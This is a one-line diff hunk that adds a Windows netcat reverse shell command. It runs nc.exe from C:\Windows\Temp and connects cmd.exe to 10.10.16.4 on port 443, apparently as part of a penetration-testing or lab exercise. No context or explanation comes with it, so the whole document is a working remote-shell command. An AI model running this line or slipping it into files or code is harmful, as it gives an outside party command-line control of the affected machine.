@@ -1,0 +1,1 @@
+C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.4 443
